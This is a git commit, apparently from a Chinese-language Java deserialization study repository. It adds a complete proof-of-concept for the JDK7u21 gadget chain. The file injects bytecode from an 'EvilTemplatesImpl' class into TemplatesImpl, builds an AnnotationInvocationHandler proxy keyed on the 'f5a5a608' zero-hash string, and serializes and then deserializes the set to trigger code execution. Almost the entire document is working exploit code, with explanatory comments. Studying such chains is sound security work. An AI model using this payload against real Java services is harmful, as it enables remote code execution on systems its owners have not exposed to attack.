7d3b69849a26664ac0d55d2a5576ce3f4daf9aa5
TonyDog <1438340838@qq.com>
2023-01-24 22:51:40 +0800

    0x1 7u21

---
+++ 2 Java反序列化基础/8 JDK7u21/Code/7u21.java
@@ -0,0 +1,66 @@
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+import javassist.ClassPool;
+import org.apache.commons.codec.binary.Base64;
+
+import javax.xml.transform.Templates;
+import java.io.ByteArrayInputStream;
+import java.io.ByteArrayOutputStream;
+import java.io.ObjectInputStream;
+import java.io.ObjectOutputStream;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.Field;
+import java.lang.reflect.InvocationHandler;
+import java.lang.reflect.Proxy;
+import java.util.HashMap;
+import java.util.HashSet;
+import java.util.LinkedHashSet;
+import java.util.Map;
+
+public class JDK7u21 {
+    public static void main(String[] args) throws Exception {
+        TemplatesImpl templates = new TemplatesImpl();
+        setFieldValue(templates, "_bytecodes", new byte[][]{
+                ClassPool.getDefault().get(evil.EvilTemplatesImpl.class.getName()).toBytecode()
+        });
+        setFieldValue(templates, "_name", "HelloTemplatesImpl");
+        setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
+
+        String zeroHashCodeStr = "f5a5a608";
+
+        // 实例化一个map，并添加Magic Number为key，也就是f5a5a608，value先随便设置一个值
+        HashMap map = new HashMap();
+        map.put(zeroHashCodeStr, "foo");
+
+        // 实例化AnnotationInvocationHandler类
+        Constructor handlerConstructor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructor(Class.class, Map.class);
+        handlerConstructor.setAccessible(true);
+        InvocationHandler tempHandler = (InvocationHandler) handlerConstructor.newInstance(Templates.class, map);
+
+        // 为tempHandler创造一层代理
+        Templates proxy = (Templates) Proxy.newProxyInstance(JDK7u21.class.getClassLoader(), new Class[]{Templates.class}, tempHandler);
+
+        // 实例化HashSet，并将两个对象放进去
+        HashSet set = new LinkedHashSet();
+        set.add(templates);
+        set.add(proxy);
+
+        // 将恶意templates设置到map中
+        map.put(zeroHashCodeStr, templates);
+
+        ByteArrayOutputStream barr = new ByteArrayOutputStream();
+        ObjectOutputStream oos = new ObjectOutputStream(barr);
+        oos.writeObject(set);
+        oos.close();
+
+        System.out.println(barr);
+        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
+        Object o = (Object)ois.readObject();
+    }
+
+    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
+        Field field = obj.getClass().getDeclaredField(fieldName);
+        field.setAccessible(true);
+        field.set(obj, value);
+    }
+}
